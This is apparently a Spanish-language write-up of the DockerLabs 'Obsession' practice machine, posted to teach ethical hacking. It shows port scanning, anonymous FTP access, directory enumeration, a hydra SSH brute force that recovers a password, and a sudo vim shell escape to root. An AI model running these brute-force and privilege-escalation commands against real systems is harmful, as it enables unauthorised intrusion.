---
title: Obsession
description: DockerLabs es una plataforma gratuita diseñada para practicar hacking ético al alcance de todo el mundo utilizando Docker. DockerLabs ofrece un entorno seguro y accesible para desplegar laboratorios vulnerables de la forma más eficiente y sencilla posible.
date: 2025-01-04
toc: true
pin: false
image:
 path: /assets/img/dockerlabs-writeup-obsession/obsession_logo.png
categories:
  - Docker Labs
tags:
  - linux
  - dockerlabs
  - ftp
  - ssh
  - http
  - tcp
  - fuzzing web
  - data leaks
  - password attacks
  - sudo abuse
  - information gathering
  - vulnerability exploitation
  - misconfiguration exploitation
  - web analysis
  - privilege escalation

---
## Information Gathering

El análisis inicial comienza con el comando ping para confirmar la accesibilidad de la máquina objetivo en la red.

```terminal
/home/kali/Documents/dockerlabs/obsession:-$ ping -c 1 127.17.0.2
PING 127.17.0.2 (127.17.0.2) 56(84) bytes of data.
64 bytes from 127.17.0.2: icmp_seq=1 ttl=64 time=0.046 ms

--- 127.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.046/0.046/0.046/0.000 ms
```

Realizo un escaneo agresivo de puertos con nmap, lo que me permite identificar rápidamente todos los puertos abiertos.

```terminal
/home/kali/Documents/dockerlabs/obsession:-$ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG nmap1 127.17.0.2
Host: 127.17.0.2 ()     Status: Up
Host: 127.17.0.2 ()     Ports: 21/open/tcp//ftp///, 22/open/tcp//ssh///, 80/open/tcp//http///   Ignored State: closed (65532)
```

Profundizo en los puertos detectados, recopilando información detallada sobre los servicios y versiones en ejecución.

```terminal
/home/kali/Documents/dockerlabs/obsession:-$ sudo nmap -sCV -p21,22,80 -vvv -oN nmap2 127.17.0.2
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 64 vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 0        0             667 Jun 18  2024 chat-gonza.txt
|_-rw-r--r--    1 0        0             315 Jun 18  2024 pendientes.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:127.0.0.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 60:05:bd:a9:97:27:a5:ad:46:53:82:15:dd:d5:7a:dd (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBICJkT7eK4HDkyFx9Sdx52QBKAlOxD2HlDN9dnPLkFaFXa2pI5bRqIRDmJLAkBTyyx2/ifDUCyl0uGyB2ExHvQ8=
|   256 0e:07:e6:d4:3b:63:4e:77:62:0f:1a:17:69:91:85:ef (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFYEzfToqDm7m3dRLdvXwcIhNZzbIgwquUJvnII1jjJn
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.58 ((Ubuntu))
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Russoski Coaching
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Utilizo WhatWeb para obtener detalles del servidor web. E identifico un correo electrónico que podría ser útil para ataques dirigidos o como pista.

```terminal
/home/kali/Documents/dockerlabs/obsession:-$ whatweb 127.17.0.2
http://127.17.0.2 [200 OK] Apache[2.4.58], Country[RESERVED][ZZ], Email[russoski@dockerlabs.es], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.58 (Ubuntu)], IP[127.17.0.2], Title[Russoski Coaching]
```

---
## Misconfiguration Exploitation

El servidor tiene habilitado el servicio FTP. Intento una conexión utilizando el usuario ```anonymous```, lo que resulta exitoso.

Al listar el contenido disponible en el servidor FTP, encuentro dos archivos de texto: ```chat-gonza.txt``` y ```pendientes.txt```. Descargo ambos archivos para su análisis local.

```terminal
/home/kali/Documents/dockerlabs/obsession:-$ ftp anonymous@127.17.0.2
Connected to 127.17.0.2.
220 (vsFTPd 3.0.5)
331 Please specify the password.
Password: anonymous
230 Login successful.
```

![](assets/img/dockerlabs-writeup-obsession/obsession1.png)
![](assets/img/dockerlabs-writeup-obsession/obsession2.png)

---
## Web Analysis

Durante el análisis inicial del servicio web, detecto una página aparentemente funcional.

![](assets/img/dockerlabs-writeup-obsession/obsession3.png)

El formulario cercano al final no parece realizar ninguna acción. Al inspeccionar el código fuente, encuentro un comentario que contiene una pista clave.

![](assets/img/dockerlabs-writeup-obsession/obsession4.png)
![](assets/img/dockerlabs-writeup-obsession/obsession5.png)

Utilizo dirb para enumerar directorios ocultos en el servidor web.

```terminal
/home/kali/Documents/dockerlabs/obsession:-$ dirb http://127.17.0.2
---- Scanning URL: http://127.17.0.2/ ----
==> DIRECTORY: http://127.17.0.2/backup/
==> DIRECTORY: http://127.17.0.2/important/
+ http://127.17.0.2/index.html (CODE:200|SIZE:5208)
+ http://127.17.0.2/server-status (CODE:200|SIZE:16029)
```

De estos resultados, el directorio ```/backup/``` contiene un archivo interesante ```backup.txt```. El contenido de este archivo confirma la sospecha inicial.

![](assets/img/dockerlabs-writeup-obsession/obsession6.png)
![](assets/img/dockerlabs-writeup-obsession/obsession7.png)

---
## Vulnerability Exploitation

Con el nombre de usuario ```russoski```, realizo un ataque de fuerza bruta contra el servicio SSH.

```terminal
/home/kali/Documents/dockerlabs/obsession:-$ sudo hydra -l russoski -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 10 -I
[22][ssh] host: 172.17.0.2   login: russoski   password: iloveme
```

![](assets/img/dockerlabs-writeup-obsession/obsession8.png)

El ataque tiene éxito y obtengo las credenciales SSH.

```terminal
/home/kali/Documents/dockerlabs/obsession:-$ ssh russoski@127.17.0.2
russoski@127.17.0.2's password: iloveme

russoski@kali:~$ id
uid=1001(russoski) gid=1001(russoski) groups=1001(russoski),100(users)
```

---
## Privilege Escalation

```terminal
russoski@kali:~$ cat /etc/passwd | grep /bash$
root:x:0:0:root:/root:/bin/bash
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
russoski:x:1001:1001:Juan Carlos,,,,Aesthetics Over Everything:/home/russoski:/bin/bash
```

El usuario ```russoski``` puede ejecutar el comando ```/usr/bin/vim``` como ```root```.

```terminal
russoski@kali:~$ sudo -l
Matching Defaults entries for russoski on kali:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User russoski may run the following commands on kali:
    (root) NOPASSWD: /usr/bin/vim
```

Consultando [GTFOBins](<https://gtfobins.github.io/gtfobins/vim/#sudo>), encuentro que vim puede ser utilizado para ejecutar una shell con privilegios elevados cuando se invoca con sudo.

```terminal
russoski@kali:~$ sudo /usr/bin/vim -c ':!/bin/sh'
# id
uid=0(root) gid=0(root) groups=0(root)
```